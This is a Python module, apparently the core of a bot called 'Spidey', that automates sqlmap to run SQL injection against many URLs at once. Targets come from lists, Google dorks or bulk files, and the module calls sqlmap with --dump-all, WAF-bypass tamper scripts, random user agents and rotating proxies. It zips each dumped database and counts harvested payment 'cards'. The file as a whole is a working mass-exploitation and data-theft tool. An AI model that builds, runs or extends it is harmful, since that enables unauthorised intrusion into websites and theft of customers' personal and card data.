"""
Spidey Core — SQLMap REST API Dumper
100% same as Telegram bot
"""
import os
import io
import json
import time
import asyncio
import random
import shutil
import tempfile
import subprocess
import zipfile
import logging

import aiohttp

logger = logging.getLogger(__name__)

# ═══════════════════════════════════════════════════════════════════════════
#  CONFIG — 100% same
# ═══════════════════════════════════════════════════════════════════════════
DEFAULT_LEVEL     = 3
DEFAULT_RISK      = 2
DEFAULT_TECHNIQUE = "BEUSTQ"
DEFAULT_TAMPER    = "space2comment,between,charencode"
DEFAULT_THREADS   = 10
DEFAULT_TIMEOUT   = 420
DEFAULT_MAX_CONC  = 5

# Auto-detect SQLMap
_sqlmap_which = shutil.which("sqlmap")
_sqlmap_local_py = os.path.join(
    os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
    "sqlmap", "sqlmap.py"
)
_sqlmap_local_api = os.path.join(
    os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
    "sqlmap", "sqlmapapi.py"
)

import sys
if _sqlmap_which:
    SQLMAP_BIN = _sqlmap_which
elif os.path.isfile(_sqlmap_local_py):
    SQLMAP_BIN = f"{sys.executable} {_sqlmap_local_py}"
else:
    SQLMAP_BIN = "sqlmap"

if shutil.which("sqlmapapi"):
    SQLMAPAPI_BIN = shutil.which("sqlmapapi")
elif os.path.isfile(_sqlmap_local_api):
    SQLMAPAPI_BIN = f"{sys.executable} {_sqlmap_local_api}"
else:
    SQLMAPAPI_BIN = ""

# REST API
API_HOST = "127.0.0.1"
API_PORT = 8775
API_BASE = f"http://{API_HOST}:{API_PORT}"
API_TIMEOUT = aiohttp.ClientTimeout(total=10)

_server_proc = None
_server_lock = asyncio.Lock()
_server_ready = False


# ═══════════════════════════════════════════════════════════════════════════
#  SERVER MANAGEMENT — 100% same
# ═══════════════════════════════════════════════════════════════════════════
async def _check_server() -> bool:
    try:
        async with aiohttp.ClientSession(timeout=API_TIMEOUT) as sess:
            async with sess.get(f"{API_BASE}/version") as r:
                return r.status == 200
    except Exception:
        return False


async def ensure_api_server() -> bool:
    """Start sqlmapapi if not running"""
    global _server_proc, _server_ready
    async with _server_lock:
        if _server_ready and await _check_server():
            return True
        if await _check_server():
            _server_ready = True
            return True
        if not SQLMAPAPI_BIN:
            logger.error("sqlmapapi not found — REST API unavailable")
            return False
        launch_cmd = SQLMAPAPI_BIN.split() + ["-s", "-H", API_HOST, "-p", str(API_PORT)]
        try:
            _server_proc = subprocess.Popen(
                launch_cmd,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                env={**os.environ, "PYTHONUNBUFFERED": "1"}
            )
        except Exception as e:
            logger.error(f"sqlmapapi start failed: {e}")
            return False
        for _ in range(20):
            await asyncio.sleep(1)
            if await _check_server():
                _server_ready = True
                logger.info(f"sqlmapapi ready @ {API_BASE}")
                return True
        return False


def stop_api_server():
    global _server_proc, _server_ready
    if _server_proc:
        try:
            _server_proc.terminate()
        except Exception:
            pass
        _server_proc = None
    _server_ready = False


async def _api_get(session, path):
    async with session.get(f"{API_BASE}{path}", timeout=API_TIMEOUT) as r:
        return await r.json()


async def _api_post(session, path, data):
    async with session.post(f"{API_BASE}{path}", json=data, timeout=API_TIMEOUT) as r:
        return await r.json()


# ═══════════════════════════════════════════════════════════════════════════
#  BUILD OPTIONS — 100% same
# ═══════════════════════════════════════════════════════════════════════════
def build_options(url=None, *, level=DEFAULT_LEVEL, risk=DEFAULT_RISK,
                  technique=DEFAULT_TECHNIQUE, threads=DEFAULT_THREADS,
                  tamper=DEFAULT_TAMPER, proxy=None, proxy_file=None,
                  forms=True, dump_all=True, random_agent=True,
                  crawl_depth=0, google_dork=None, bulk_file=None,
                  batch=True, flush_session=True, skip_waf=True,
                  timeout=10, retries=2, verbose=0) -> dict:
    opts = {
        "level": level, "risk": risk, "technique": technique, "threads": threads,
        "tamper": tamper, "forms": forms, "dumpAll": dump_all,
        "randomAgent": random_agent, "batch": batch, "flushSession": flush_session,
        "timeout": timeout, "retries": retries, "verbose": verbose,
        "getBanner": True, "getCurrentUser": True, "getCurrentDb": True,
        "getDbs": True, "isDba": True,
    }
    if url:
        opts["url"] = url
    if proxy:
        opts["proxy"] = proxy
    if proxy_file and os.path.isfile(proxy_file):
        opts["proxyFile"] = proxy_file
    if google_dork:
        opts["googleDork"] = google_dork
        opts.pop("url", None)
    if bulk_file and os.path.isfile(bulk_file):
        opts["bulkFile"] = bulk_file
        opts.pop("url", None)
    if crawl_depth and crawl_depth > 0:
        opts["crawlDepth"] = crawl_depth
    return opts


# ═══════════════════════════════════════════════════════════════════════════
#  RESULT CLASS — 100% same
# ═══════════════════════════════════════════════════════════════════════════
class ApiTaskResult:
    __slots__ = (
        "url", "taskid", "success", "cards", "tables", "banner",
        "current_user", "current_db", "dbs", "log_lines", "error",
        "csv_dir", "severity", "keyword_matches", "auto_pairs", "dbms"
    )

    def __init__(self, url=""):
        self.url = url
        self.taskid = ""
        self.success = False
        self.cards = []
        self.tables = []
        self.banner = ""
        self.current_user = ""
        self.current_db = ""
        self.dbs = []
        self.log_lines = []
        self.error = ""
        self.csv_dir = ""
        self.severity = "⚪ INFO"
        self.keyword_matches = {}
        self.auto_pairs = []
        self.dbms = ""


# ═══════════════════════════════════════════════════════════════════════════
#  RUN API TASK — 100% same
# ═══════════════════════════════════════════════════════════════════════════
async def run_api_task(options: dict, *, task_timeout=DEFAULT_TIMEOUT,
                       log_cb=None, stop_event=None, csv_output_dir="") -> ApiTaskResult:
    """
    Run one SQLMap task.
    Same as bot: creates task, sets options, starts scan, polls for logs/status.
    """
    result = ApiTaskResult(
        url=options.get("url", options.get("googleDork", options.get("bulkFile", "")))
    )
    if not await ensure_api_server():
        result.error = "sqlmapapi server unavailable"
        return result

    async with aiohttp.ClientSession() as sess:
        # Create task
        try:
            resp = await _api_get(sess, "/task/new")
            if not resp.get("success"):
                result.error = "task/new failed"
                return result
            taskid = resp["taskid"]
            result.taskid = taskid
        except Exception as e:
            result.error = f"task/new error: {e}"
            return result

        # Set options
        if csv_output_dir:
            options = {**options, "oDir": csv_output_dir}
        try:
            await _api_post(sess, f"/option/{taskid}/set", options)
        except Exception as e:
            result.error = f"option/set error: {e}"
            return result

        # Start scan
        try:
            start_data = {"url": options["url"]} if "url" in options else {}
            start_resp = await _api_post(sess, f"/scan/{taskid}/start", start_data)
            if not start_resp.get("success"):
                result.error = f"scan/start failed: {start_resp}"
                await _api_get(sess, f"/task/{taskid}/delete")
                return result
        except Exception as e:
            result.error = f"scan/start error: {e}"
            return result

        # Poll logs + status
        deadline = time.time() + task_timeout
        seen = 0
        status = "running"
        while status in ("running", "not running"):
            if stop_event and stop_event.is_set():
                try:
                    await _api_get(sess, f"/scan/{taskid}/kill")
                except Exception:
                    pass
                result.error = "cancelled"
                break
            if time.time() > deadline:
                try:
                    await _api_get(sess, f"/scan/{taskid}/kill")
                except Exception:
                    pass
                result.error = "timeout"
                break
            await asyncio.sleep(4)

            # Fetch log
            try:
                lr = await _api_get(sess, f"/scan/{taskid}/log")
                entries = lr.get("log", [])
                new = entries[seen:]
                seen = len(entries)
                for e in new:
                    line = e.get("message", "")
                    result.log_lines.append(line)
                    if log_cb and line:
                        try:
                            log_cb(line)
                        except Exception:
                            pass
            except Exception:
                pass

            # Fetch status
            try:
                st = await _api_get(sess, f"/scan/{taskid}/status")
                status = st.get("status", "terminated")
            except Exception:
                break

        # Fetch data
        try:
            dr = await _api_get(sess, f"/scan/{taskid}/data")
            if dr.get("success") and dr.get("data"):
                raw = dr["data"]
                for item in raw:
                    it, val = item.get("type", 0), item.get("value", {})
                    if it == 2:
                        result.tables.append(val)
                    elif it == 1:
                        if isinstance(val, str) and "banner" in val.lower():
                            result.banner = val
        except Exception:
            pass

        # Find CSV dir
        dirs = []
        if csv_output_dir and os.path.isdir(csv_output_dir):
            dirs.append(csv_output_dir)
        url_for_domain = options.get("url", "") or ""
        if url_for_domain:
            try:
                from urllib.parse import urlparse as _up
                dom = _up(url_for_domain).netloc or ""
                if dom:
                    dd = os.path.join(os.path.expanduser("~/.sqlmap/output"), dom)
                    if os.path.isdir(dd):
                        dirs.append(dd)
            except Exception:
                pass
        sqlmap_root = os.path.expanduser("~/.sqlmap/output")
        if os.path.isdir(sqlmap_root):
            dirs.append(sqlmap_root)
        if dirs:
            result.csv_dir = dirs[0]

        result.success = bool(result.tables or result.csv_dir)

        # Parse log for DBMS/user/db
        full_log = "\n".join(result.log_lines)
        for line in result.log_lines:
            ll = line.lower()
            if "the back-end dbms is" in ll:
                result.dbms = line.split("is")[-1].strip()
                break
            for name in ("mysql", "postgresql", "mssql", "oracle", "sqlite", "mariadb"):
                if name in ll and ("identified" in ll or "server version" in ll):
                    result.dbms = name.upper()
                    break
        for line in full_log.splitlines():
            ll = line.lower()
            if "current user is" in ll and not result.current_user:
                result.current_user = line.strip()
            if "current database is" in ll and not result.current_db:
                result.current_db = line.strip()

        # Delete task
        try:
            await _api_get(sess, f"/task/{taskid}/delete")
        except Exception:
            pass

    return result


# ═══════════════════════════════════════════════════════════════════════════
#  MULTIPLE URLS DUMP — 100% same
# ═══════════════════════════════════════════════════════════════════════════
async def api_dump_multiple(urls, *, proxy_list=None, proxy_file_path=None,
                            level=DEFAULT_LEVEL, risk=DEFAULT_RISK,
                            technique=DEFAULT_TECHNIQUE, threads=DEFAULT_THREADS,
                            tamper=DEFAULT_TAMPER, crawl_depth=0,
                            task_timeout=DEFAULT_TIMEOUT, max_concurrent=DEFAULT_MAX_CONC,
                            stop_event=None, progress_cb=None,
                            per_result_cb=None, log_sample_cb=None):
    """Dump multiple URLs in parallel"""
    if not await ensure_api_server():
        return []
    if proxy_list is None:
        proxy_list = []
    sem = asyncio.Semaphore(max_concurrent)
    results = []
    done = [0]
    base_tmp = tempfile.mkdtemp(prefix="spidey_api_")
    _pf = proxy_file_path
    if proxy_list and not _pf:
        pf = os.path.join(base_tmp, "proxies.txt")
        with open(pf, "w") as f:
            f.write("\n".join(proxy_list))
        _pf = pf

    async def _one(idx, url):
        if stop_event and stop_event.is_set():
            done[0] += 1
            return
        url_dir = os.path.join(base_tmp, f"t{idx}")
        os.makedirs(url_dir, exist_ok=True)
        px = random.choice(proxy_list) if proxy_list else None
        opts = build_options(
            url, level=level, risk=risk, technique=technique,
            threads=threads, tamper=tamper, proxy=px,
            proxy_file=_pf, crawl_depth=crawl_depth
        )

        def _log(line):
            if log_sample_cb:
                try:
                    log_sample_cb(url, line)
                except Exception:
                    pass

        async with sem:
            r = await run_api_task(
                opts, task_timeout=task_timeout,
                log_cb=_log, stop_event=stop_event, csv_output_dir=url_dir
            )

        done[0] += 1
        if r.success:
            results.append(r)
            if per_result_cb:
                zip_src = r.csv_dir if (r.csv_dir and os.path.isdir(r.csv_dir)) else url_dir
                zb = _zip_dir(zip_src)
                if not zb:
                    sr = os.path.expanduser("~/.sqlmap/output")
                    if os.path.isdir(sr):
                        zb = _zip_dir(sr)
                try:
                    await per_result_cb(r, zb)
                except Exception:
                    pass
        if progress_cb:
            try:
                await progress_cb(done[0], len(urls), len(results))
            except Exception:
                pass

    await asyncio.gather(
        *[_one(i + 1, u) for i, u in enumerate(urls)],
        return_exceptions=True
    )
    shutil.rmtree(base_tmp, ignore_errors=True)
    return results


# ═══════════════════════════════════════════════════════════════════════════
#  GOOGLE DORK DUMP — 100% same
# ═══════════════════════════════════════════════════════════════════════════
async def api_google_dork_dump(dork, *, proxy_list=None, level=DEFAULT_LEVEL,
                               risk=DEFAULT_RISK, technique=DEFAULT_TECHNIQUE,
                               threads=DEFAULT_THREADS, tamper=DEFAULT_TAMPER,
                               task_timeout=DEFAULT_TIMEOUT, stop_event=None,
                               log_cb=None, per_result_cb=None):
    """SQLMap handles google dork directly"""
    if not await ensure_api_server():
        r = ApiTaskResult(url=dork)
        r.error = "sqlmapapi unavailable"
        return r
    if proxy_list is None:
        proxy_list = []
    px = random.choice(proxy_list) if proxy_list else None
    opts = build_options(
        None, google_dork=dork, level=level, risk=risk,
        technique=technique, threads=threads, tamper=tamper, proxy=px
    )
    tmp = tempfile.mkdtemp(prefix="spidey_dork_")
    try:
        r = await run_api_task(
            opts, task_timeout=task_timeout, log_cb=log_cb,
            stop_event=stop_event, csv_output_dir=tmp
        )
        if r.success and per_result_cb:
            try:
                await per_result_cb(r, _zip_dir(tmp))
            except Exception:
                pass
    finally:
        shutil.rmtree(tmp, ignore_errors=True)
    return r


# ═══════════════════════════════════════════════════════════════════════════
#  BULK DUMP — 100% same
# ═══════════════════════════════════════════════════════════════════════════
async def api_bulk_dump(urls, *, proxy_list=None, level=DEFAULT_LEVEL,
                        risk=DEFAULT_RISK, technique=DEFAULT_TECHNIQUE,
                        threads=DEFAULT_THREADS, tamper=DEFAULT_TAMPER,
                        task_timeout=DEFAULT_TIMEOUT, stop_event=None, log_cb=None):
    """SQLMap reads from bulk file"""
    if not await ensure_api_server():
        r = ApiTaskResult()
        r.error = "sqlmapapi unavailable"
        return r
    tmp = tempfile.mkdtemp(prefix="spidey_bulk_")
    uf = os.path.join(tmp, "urls.txt")
    with open(uf, "w") as f:
        f.write("\n".join(urls))
    if proxy_list is None:
        proxy_list = []
    px = random.choice(proxy_list) if proxy_list else None
    opts = build_options(
        None, bulk_file=uf, level=level, risk=risk,
        technique=technique, threads=threads, tamper=tamper, proxy=px
    )
    try:
        r = await run_api_task(
            opts, task_timeout=task_timeout, log_cb=log_cb,
            stop_event=stop_event, csv_output_dir=tmp
        )
    finally:
        shutil.rmtree(tmp, ignore_errors=True)
    return r


# ═══════════════════════════════════════════════════════════════════════════
#  CANCEL TASK — 100% same
# ═══════════════════════════════════════════════════════════════════════════
async def cancel_task(taskid: str) -> bool:
    try:
        async with aiohttp.ClientSession(timeout=API_TIMEOUT) as s:
            r = await _api_get(s, f"/scan/{taskid}/kill")
            return r.get("success", False)
    except Exception:
        return False


# ═══════════════════════════════════════════════════════════════════════════
#  ZIP DIRECTORY — 100% same
# ═══════════════════════════════════════════════════════════════════════════
def _zip_dir(directory: str) -> bytes:
    """Zip all files in directory → bytes"""
    buf = io.BytesIO()
    has = False
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        for root, _, files in os.walk(directory):
            for fn in files:
                fp = os.path.join(root, fn)
                zf.write(fp, os.path.relpath(fp, directory))
                has = True
    buf.seek(0)
    return buf.read() if has else b""


# ═══════════════════════════════════════════════════════════════════════════
#  FORMAT SUMMARY — 100% same
# ═══════════════════════════════════════════════════════════════════════════
def format_result_summary(r: ApiTaskResult) -> str:
    lines = []
    sep = "─" * 32
    if r.error and not r.success:
        return f"✗ {r.error}"
    sev = getattr(r, "severity", "⚪ INFO")
    lines.append(f"✅ {sev}")
    lines.append(f"🌐 {r.url[:70]}")
    lines.append(sep)
    dbms = getattr(r, "dbms", "") or r.banner
    if dbms:
        lines.append(f"🗄 DBMS: {dbms[:80]}")
    if r.current_db:
        lines.append(f"📂 DB: {r.current_db[:60]}")
    if r.current_user:
        lines.append(f"👤 USER: {r.current_user[:60]}")
    if r.dbs:
        lines.append(f"📤 DBs: {', '.join(r.dbs[:6])}")
    if r.tables:
        lines.append(f"📋 TABLES: {len(r.tables)}")
    if r.cards:
        lines.append(f"💳 CARDS: {len(r.cards)}")
    return "\n".join(lines)


# ═══════════════════════════════════════════════════════════════════════════
#  SUBPROCESS FALLBACK — 100% same
# ═══════════════════════════════════════════════════════════════════════════
PER_URL_TIMEOUT = 420
MAX_CONCURRENT = 8
SQLMAP_THREADS = 15


def _build_subproc_cmd(url, output_dir, proxy_url="", level=None, risk=None,
                       technique=None, tamper=None, threads=None):
    bin_parts = SQLMAP_BIN.split() if " " in SQLMAP_BIN else [SQLMAP_BIN]
    cmd = bin_parts + [
        "-u", url, "--batch", "--dump-all",
        "--level", str(level or DEFAULT_LEVEL),
        "--risk", str(risk or DEFAULT_RISK),
        "--threads", str(threads or SQLMAP_THREADS),
        "--random-agent", "--forms",
        "--technique", technique or DEFAULT_TECHNIQUE,
        "--tamper", tamper or DEFAULT_TAMPER,
        "--skip-waf", "--timeout", "10", "--retries", "2",
        "--output-dir", output_dir, "--flush-session", "-v", "0"
    ]
    if proxy_url:
        cmd += ["--proxy", proxy_url]
    return cmd


def _parse_sqlmap_success(stdout):
    low = stdout.lower()
    return any(k in low for k in [
        "is vulnerable", "fetched data logged", "dumped to",
        "database management system", "retrieved:", "table:",
        "backend dbms:", "found a total of"
    ])


class SqlmapResult:
    def __init__(self):
        self.url = ""
        self.success = False
        self.cards = []
        self.csv_files = 0
        self.output_dir = ""
        self.log = ""
        self.error = ""


async def sqlmap_dump_url(url, output_dir, proxy_url="", stop_event=None):
    r = SqlmapResult()
    r.url = url
    cmd = _build_subproc_cmd(url, output_dir, proxy_url)
    try:
        proc = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.STDOUT,
            env={**os.environ, "PYTHONUNBUFFERED": "1"}
        )

        async def _kill():
            if stop_event:
                await stop_event.wait()
                try:
                    proc.kill()
                except Exception:
                    pass

        killer = asyncio.create_task(_kill()) if stop_event else None
        try:
            stdout, _ = await asyncio.wait_for(
                proc.communicate(), timeout=PER_URL_TIMEOUT
            )
            log = stdout.decode(errors="ignore")
        except asyncio.TimeoutError:
            try:
                proc.kill()
            except Exception:
                pass
            r.error = "timeout"
            return r
        finally:
            if killer and not killer.done():
                killer.cancel()

        r.log = log
        r.success = _parse_sqlmap_success(log)
    except Exception as e:
        r.error = str(e)
    return r


def zip_output(output_dir):
    return _zip_dir(output_dir)


async def sqlmap_dump_multiple(urls, base_dir, proxy_list=None, stop_event=None,
                               progress_cb=None, max_concurrent=MAX_CONCURRENT,
                               per_result_cb=None):
    if proxy_list is None:
        proxy_list = []
    sem = asyncio.Semaphore(max_concurrent)
    results = []
    done = [0]

    async def _one(idx, url):
        if stop_event and stop_event.is_set():
            done[0] += 1
            return
        url_dir = os.path.join(base_dir, f"target_{idx}")
        os.makedirs(url_dir, exist_ok=True)
        px = random.choice(proxy_list) if proxy_list else ""
        async with sem:
            r = await sqlmap_dump_url(url, url_dir, px, stop_event)
        done[0] += 1
        if r.success:
            results.append(r)
            if per_result_cb:
                try:
                    await per_result_cb(r, zip_output(url_dir))
                except Exception:
                    pass
        if progress_cb:
            try:
                await progress_cb(done[0], len(urls), len(results))
            except Exception:
                pass

    await asyncio.gather(
        *[_one(i + 1, u) for i, u in enumerate(urls)],
        return_exceptions=True
    )
    return results